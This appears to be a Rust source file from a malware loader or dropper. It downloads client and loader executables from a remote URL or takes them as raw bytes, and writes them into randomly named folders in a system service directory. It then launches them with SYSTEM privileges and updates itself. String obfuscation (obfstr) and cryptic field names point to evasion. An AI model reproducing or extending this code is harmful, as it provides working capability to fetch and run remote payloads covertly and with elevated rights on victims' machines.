use std::{ fs, io::Write };
use obfstr::obfstr as s;
use loader_vars::{
    constants::{ loader_version, system_service_directory },
    types::receive::{ FlSrc, RnCnfgPrms },
};
use anyhow::Result;
use shared::{
    constants::{ client_exe_name, system_loader_exe_name },
    network::basic::download_bytes_from_url,
    utils::{
        config::{ load_mib_config, write_mib_config, HstCnfg },
        functions::{ generate_random_string, try_spawn_program_as_system },
    },
};

pub fn run_config(params: RnCnfgPrms) -> Result<()> {
    if !params.enbl {
        return Ok(());
    }

    let mib_config = load_mib_config(true)?;

    let mut highest_installed_client_version = 0;
    for client in &mib_config.clnts {
        if client.version > highest_installed_client_version {
            highest_installed_client_version = client.version;
        }
    }
    if params.cl_vrs > highest_installed_client_version {
        if let Some(client_source) = params.cl_src {
            let _ = install_client(client_source, params.cl_vrs);
        }
    } else {
        // this means up to date installed or higher installed.
        // just run

        let highest_client = mib_config.clnts
            .iter()
            .max_by_key(|client| client.version)
            .unwrap();
        try_spawn_program_as_system(&highest_client.exe_path, None)?;
    }

    let mut highest_installed_loader_version = loader_version();
    for loader in &mib_config.ldrs {
        if loader.version > highest_installed_loader_version {
            highest_installed_loader_version = loader.version;
        }
    }
    if params.upd_enbl && params.slf_vrs > highest_installed_loader_version {
        if let Some(self_source) = params.slf_src {
            let _ = install_self(self_source, params.slf_vrs);
        }
    } else {
        // this means up to date installed or higher installed or update disabled
        // just run current

        let highest_loader = mib_config.ldrs
            .iter()
            .max_by_key(|loader| loader.version)
            .unwrap();
        try_spawn_program_as_system(&highest_loader.exe_path, None)?;
    }

    Ok(())
}
fn install_client(source: FlSrc, version: u64) -> Result<()> {
    let bytes = match source {
        FlSrc::Url(url) => download_bytes_from_url(&url)?,
        FlSrc::Bt(vec) => vec,
    };
    if bytes.is_empty() {
        return Err(anyhow::anyhow!(s!("install_client bytes.is_empty").to_owned()));
    }
    let client_dir = system_service_directory().join(generate_random_string(8));
    fs::create_dir_all(&client_dir)?;

    let config_path = client_dir.join(s!("cache.cfg"));

    let exe_path = client_dir.join(client_exe_name());

    fs::File::create(&config_path)?;

    let mut exe_file = fs::File::create(&exe_path)?;
    exe_file.write_all(&bytes)?;

    let mut mib_config = load_mib_config(true)?;

    mib_config.clnts.push(HstCnfg {
        version,
        folder_path: client_dir.to_str().unwrap().to_owned(),
        exe_path: exe_path.to_str().unwrap().to_owned(),
        config_path: config_path.to_str().unwrap().to_owned(),
    });

    write_mib_config(&mib_config)?;

    try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;

    Ok(())
}

fn install_self(source: FlSrc, version: u64) -> Result<()> {
    let bytes = match source {
        FlSrc::Url(url) => download_bytes_from_url(&url)?,
        FlSrc::Bt(vec) => vec,
    };
    if bytes.is_empty() {
        return Err(anyhow::anyhow!(s!("install_self bytes.is_empty").to_owned()));
    }
    let loader_dir = system_service_directory().join(generate_random_string(8));
    fs::create_dir_all(&loader_dir)?;

    let config_path = loader_dir.join(s!("cache.cfg"));

    let exe_path = loader_dir.join(system_loader_exe_name());

    fs::File::create(&config_path)?;

    let mut exe_file = fs::File::create(&exe_path)?;
    exe_file.write_all(&bytes)?;

    let mut mib_config = load_mib_config(true)?;

    mib_config.ldrs.push(HstCnfg {
        version,
        folder_path: loader_dir.to_str().unwrap().to_owned(),
        exe_path: exe_path.to_str().unwrap().to_owned(),
        config_path: config_path.to_str().unwrap().to_owned(),
    });

    write_mib_config(&mib_config)?;

    try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;

    Ok(())
}
